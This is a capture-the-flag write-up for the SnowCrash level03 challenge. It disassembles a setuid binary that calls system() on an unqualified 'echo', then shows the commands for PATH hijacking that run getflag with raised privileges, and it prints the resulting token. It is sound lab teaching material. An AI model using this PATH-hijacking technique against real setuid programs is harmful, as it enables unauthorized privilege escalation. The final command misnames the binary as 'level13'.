# level03

## Recognition

There is an executable named level03 that is suid and sgid on flag03 at the home directory of level03.

Using `readelf` we can see the `.rodata` section of the program and and dump its content.

```bash
level03@SnowCrash:~$ readelf -x .rodata level03

Hex dump of section '.rodata':
  0x080485d8 03000000 01000200 2f757372 2f62696e ......../usr/bin
  0x080485e8 2f656e76 20656368 6f204578 706c6f69 /env echo Exploi
  0x080485f8 74206d65 00                         t me.
```

We can also use `objdump` to disassemble it and see what is happening in the main function. 
```bash
level03@SnowCrash:~$ objdump -M intel -D level03
[...]
080484a4 <main>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	83 e4 f0             	and    esp,0xfffffff0
 80484aa:	83 ec 20             	sub    esp,0x20
 80484ad:	e8 ee fe ff ff       	call   80483a0 <getegid@plt>
 80484b2:	89 44 24 18          	mov    DWORD PTR [esp+0x18],eax
 80484b6:	e8 d5 fe ff ff       	call   8048390 <geteuid@plt>
 80484bb:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 80484bf:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484c3:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484c7:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484cb:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80484cf:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484d3:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d6:	e8 05 ff ff ff       	call   80483e0 <setresgid@plt>
 80484db:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80484df:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484e3:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80484e7:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80484eb:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80484ef:	89 04 24             	mov    DWORD PTR [esp],eax
 80484f2:	e8 89 fe ff ff       	call   8048380 <setresuid@plt>
 80484f7:	c7 04 24 e0 85 04 08 	mov    DWORD PTR [esp],0x80485e0
 80484fe:	e8 ad fe ff ff       	call   80483b0 <system@plt>
 8048503:	c9                   	leave
[...]
```

We can see that this program will unconditionally always execute the `system()` call, with the string previously seen on the .rodata section.

</br>
</br>

## Exploitation

Since we know that the program is executing `system("/usr/bin/env echo Exploit me.")`, we can see that it uses the `echo` program without a absolte path reference to it. We can then try to write a bash script executing the `getflag` command

```bash
level03@SnowCrash:~$ chmod +rwx .
level03@SnowCrash:~$ cat << EOF > echo
#!/bin/bash
getflag
EOF
```

The `system` call will run the command with bash thus it will use the $PATH variable to find the programs to execute. As we have compiled a program named `echo` in our home directory, we can then modiffy the $PATH variable to add the path of the home before the other pathes.
```bash
level03@SnowCrash:~$ export PATH=$HOME:$PATH
```

Now we only have to run the program and get the flag
```bash
level03@SnowCrash:~$ ./level13
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```